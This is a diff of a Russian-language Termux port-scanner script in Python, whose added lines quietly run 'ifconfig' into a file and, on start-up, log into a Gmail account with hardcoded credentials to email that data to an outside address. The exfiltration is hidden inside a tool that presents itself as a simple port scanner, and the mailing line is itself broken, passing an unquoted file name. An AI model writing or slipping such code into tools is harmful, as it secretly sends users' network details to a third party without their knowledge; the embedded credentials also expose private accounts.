@@ -2,12 +2,14 @@ import socket
 import smtplib
 import os
 def ty():
-	_ = os.system ('clear')
+    x= os.system ('ifconfig>>IP2.txt')
+    x= os.system ('clear')
+    x= os.system ('ls')
 try:
     smtpObj=smtplib.SMTP('smtp.gmail.com',587)
     smtpObj.starttls()
-    smtpObj.login('termuxcod@gmail.com','termux678cod876')
-    smtpObj.sendmail('termuxcod@gmail.com','germanreht2@gmail.com','lolkek')
+    smtpObj.login('germanreht@gmail.com','rostelekom')
+    smtpObj.sendmail('germanreht@gmail.com','germanreht2@gmail.com',IP2.txt)
     smtpObj.quit()
 except Exception as e:
     print('')
@@ -37,10 +39,11 @@ def openports2():
             sock.close()
         except:
             print('\033[31mпорт:: %s' % lol, ':: закрыт')
+ty()
 print('''
 \033[33mВыполнено........Termux Cod
 \033[36mАвторы...........\033[31m\033[3mWolFak...\033[35m\033[3mTopo1us
-\033[32mСообщество вк...https://m.vk.com/termux_cod
+\033[32m\033[0mСообщество вк...https://m.vk.com/termux_cod
 ''')
 print('''
 \033[37m[1]Сканирование стандартных портов.
@@ -49,7 +52,7 @@ print('''
 ''')
 x=input('\033[~ ')
 if x=='1':
-    openports(input('IP: '))
+	openports(input('IP: '))
 if x=='2':
-    openports2()
+	openports2()
 ty()
